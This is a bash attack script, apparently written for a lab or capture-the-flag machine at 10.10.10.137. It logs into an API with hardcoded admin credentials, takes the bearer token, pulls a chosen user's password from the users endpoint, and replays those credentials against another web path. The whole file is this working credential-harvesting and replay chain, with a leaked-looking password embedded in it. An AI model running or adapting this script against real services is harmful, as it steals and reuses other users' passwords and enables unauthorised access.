#!/bin/bash

if [ "$3" == "" ];
then
    echo "Usage: $0 [username] [POST/GET] [web extension]"
    exit;
fi

token=$(curl -X POST -H 'Content-Type: application/json' -d '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}' http://10.10.10.137:3000/login 2>/dev/null | awk -F "\"" {'print $10'})
password=$(curl -X GET -H "Authorization: Bearer $token" -d '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}' http://10.10.10.137:3000/users/$1 2>/dev/null | awk -F "\"" {'print $8'})
curl -X $2 -H "Authorization: Bearer $token" -d "{\"username\":\"$1\", \"password\":\"$password\"}" http://10.10.10.137$3

printf "\n"
